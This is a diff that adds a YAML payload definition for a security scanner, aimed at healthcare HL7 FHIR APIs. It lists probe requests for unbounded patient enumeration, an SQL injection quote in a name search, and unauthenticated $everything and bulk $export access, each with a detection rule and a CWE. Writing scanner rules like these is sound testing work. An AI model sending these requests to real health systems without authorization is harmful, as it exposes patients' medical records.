@@ -1,0 +1,41 @@
+id: medical-hl7-fhir
+name: Medical — HL7 FHIR API injection
+context:
+  technologies: ["FHIR", "HL7", "Epic", "Cerner", "MEDITECH"]
+  paths: ["/fhir", "/api/fhir", "/smart-on-fhir"]
+
+payloads:
+  - value: "/Patient?_count=9999&_include=*"
+    detect: { body_contains: "resourceType" }
+    id: med-fhir-enum-01
+    title: "FHIR — patient enumeration (unbounded _count)"
+    severity: critical
+    cwe: CWE-200
+
+  - value: "/Patient?name:contains='"
+    detect: { body_regex: "OperationOutcome|diagnostics" }
+    id: med-fhir-sqli-01
+    title: "FHIR — SQL injection via search parameter"
+    severity: critical
+    cwe: CWE-89
+
+  - value: "/metadata"
+    detect: { body_contains: "CapabilityStatement" }
+    id: med-fhir-meta-01
+    title: "FHIR — metadata endpoint exposed (capability statement)"
+    severity: medium
+    cwe: CWE-200
+
+  - value: "/Patient/$everything"
+    detect: { body_contains: "Bundle" }
+    id: med-fhir-everything-01
+    title: "FHIR — $everything operation accessible (full patient data)"
+    severity: critical
+    cwe: CWE-862
+
+  - value: "/Patient/1/$export"
+    detect: { body_regex: "Content-Location|202 Accepted" }
+    id: med-fhir-export-01
+    title: "FHIR — bulk export endpoint accessible without auth"
+    severity: critical
+    cwe: CWE-862
